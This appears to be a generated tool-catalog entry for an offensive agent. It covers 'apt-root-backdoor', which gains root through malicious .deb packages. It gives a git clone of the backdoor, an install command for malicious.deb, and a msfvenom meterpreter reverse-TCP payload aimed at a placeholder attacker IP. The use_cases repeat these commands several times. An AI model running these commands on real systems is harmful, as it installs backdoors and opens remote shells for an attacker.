documentation.when_to_use: Use during the 'post_exploit' phase against surfaces [web, shell_windows, shell_linux] in the Command and Control category. Fits when the engagement needs: Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages.
documentation.why_to_use: Prefer this tool based on upstream description: Exploiting apt install to Gain Root Access via Malicious .deb Packages.
documentation.how_to_use: Install/setup: git clone https://github.com/abdulrafayishaCkER/apt-root-backdoor.git. Run the primary entrypoint as shown in upstream docs, e.g. `sudo apt install ./malicious.deb`. Further invocations from upstream: `dpkg-deb -R filesearch_1.0.deb extracted/`; `msfvenom -p python/meterpreter_reverse_tcp \`. Exploiting apt install to Gain Root Access via Malicious .deb Packages.

trust.warning: Attribution/index entry only. Audit provenance, code, releases and licence before use.

use_cases: When you need Command and Control, use apt-root-backdoor because Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages.
When the engagement is in the post_exploit phase, use apt-root-backdoor as a cataloged Command and Control tool with operator ACCEPT/CANCEL gating.
When you need a concrete invocation, run `sudo apt install ./malicious.deb` as documented upstream for apt-root-backdoor.
When you need a concrete invocation, run `dpkg-deb -R filesearch_1.0.deb extracted/` as documented upstream for apt-root-backdoor.
When you need a concrete invocation, run `msfvenom -p python/meterpreter_reverse_tcp \` as documented upstream for apt-root-backdoor.
When you need a concrete invocation, run `LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py` as documented upstream for apt-root-backdoor.
When chaining Command and Control tools, pair apt-root-backdoor with sibling catalog entries sharing its attack_surface/phase_hint.
When validating lab setup, run `apt-root-backdoor --help` (or the README entrypoint) and confirm required hardware/deps from the catalog.
